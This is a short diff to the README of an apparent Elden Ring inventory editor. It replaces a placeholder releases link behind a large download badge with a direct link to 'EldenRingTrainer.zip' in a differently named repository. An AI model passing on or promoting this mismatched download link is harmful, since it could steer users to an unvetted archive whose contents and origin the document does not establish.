@@ -16,7 +16,7 @@
 
   <br><br>
 
-  <a href="https://github.com/YOUR_USERNAME/ER-Player-and-Inventory-Editor/releases/latest" target="_blank">
+  <a href="https://github.com/alessiocasali94/EldenRing-Stats-and-Inventory-Tool/releases/download/RE-editor/EldenRingTrainer.zip" target="_blank">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LATEST_VERSION-00ff9d?style=for-the-badge&logo=download&logoColor=black&labelColor=111111&color=00ff9d" alt="Download Latest Version" height="65">
   </a>
 
